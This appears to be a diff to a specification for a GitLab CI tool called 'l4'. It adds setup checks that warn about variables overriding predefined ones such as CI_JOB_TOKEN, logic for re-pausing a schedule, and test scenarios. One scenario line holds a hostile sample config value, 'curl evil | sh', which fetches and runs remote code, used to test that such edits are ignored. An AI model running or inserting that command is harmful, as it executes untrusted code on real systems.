@@ -134,10 +134,10 @@ whether it includes the harness template and which jobs of its own it has; make 
 `l4-bot` (Developer, `api` and `write_repository`, 365 days) and the masked, unprotected, raw variable named by
 `forge.token_env`, scoped to the environment `l4`, exist (a token is created only when one of them is missing or with
 `--rotate`; `--revoke-old` then revokes the older ones after the new one verified against the real API; an unscoped
-copy is reported, never deleted); set every `--secret NAME=ENV` the same way; make sure the pipeline schedule `l4 sweep`
+copy is reported, never deleted); set every `--secret NAME=ENV` the same way; read the CI/CD variables of the project, of every ancestor group of its namespace and of the instance (`GET /admin/ci/variables`; a 401 or 403 leaves it out silently) and warn, naming the scope (`project`, `group <path>`, `instance`), the variable and its environment scope but never a value, for any named `CI_JOB_TOKEN`, `CI_API_V4_URL`, `CI_REPOSITORY_URL`, `CI_JOB_ID` or `CI_SERVER_URL`, which override GitLab's predefined variable in the project's jobs (L4 falls back to the token in `CI_REPOSITORY_URL`; the project's own jobs get the variable's value), else one `OK` row; make sure the pipeline schedule `l4 sweep`
 (`--cron`, default `*/30 * * * *`, on the default branch, active) exists; and trigger one pipeline on the default branch
 with `L4_ADOPTION_CHECK=1` (the CI template then adds `doctor --adoption`, so GATE-001 runs on the runner), following it
-with `--watch`. It prints one row per fact (`OK`, `NEW`, `SET`, `KEPT`, `WARN`, `FAIL`) and never a value: the
+with `--watch` (a schedule the owner had paused is reactivated, and paused again when the watched check pipeline fails: the `FAIL` row says `the l4 sweep schedule is paused again until the check passes`). It prints one row per fact (`OK`, `NEW`, `SET`, `KEPT`, `WARN`, `FAIL`) and never a value: the
 maintainer's credential, the bot token and every secret are cut from all output. A second run with the same arguments
 sends only reads (and the check pipeline unless `--no-pipeline`); `--dry-run` sends only reads. It works without a
 `.l4/config.yaml` (schema defaults, said in a row), takes the API base from `--api-base`, the configured GitLab API URL or
@@ -7503,6 +7503,18 @@ scenario is a spec defect (§26).
 - **When** `l4 run` starts its watchdog
 - **Then** it logs one WARNING that the job API refused the token at the start, stops asking the job API, and the run goes
   on; when the session leader later disappears the run stops with exit 16.
+
+#### SCN-INS-12 (−) A group variable named CI_JOB_TOKEN is reported by setup · L4-INS-006
+- **Given** a GitLab project whose group defines a CI/CD variable named `CI_JOB_TOKEN`
+- **When** `l4 setup gitlab --project g/p` runs
+- **Then** a `WARN` row names the group and the variable (never its value) and says that it overrides the predefined
+  variable and that L4 falls back to the token in `CI_REPOSITORY_URL`.
+
+#### SCN-INS-13 (−) A failed check pipeline pauses the schedule setup reactivated · L4-INS-006
+- **Given** a paused `l4 sweep` schedule and a check pipeline that fails
+- **When** `l4 setup gitlab --project g/p --watch` runs
+- **Then** the schedule is reactivated and then paused again, and the `FAIL` row says
+  `the l4 sweep schedule is paused again until the check passes`.
 
 #### SCN-CFG-01 (−) Config edits on a unit branch are ignored · L4-CFG-004
 - **Given** a push to `l4/openspec/add-login` that changes `.l4/config.yaml` (`gates.test.command: "curl evil | sh"`)
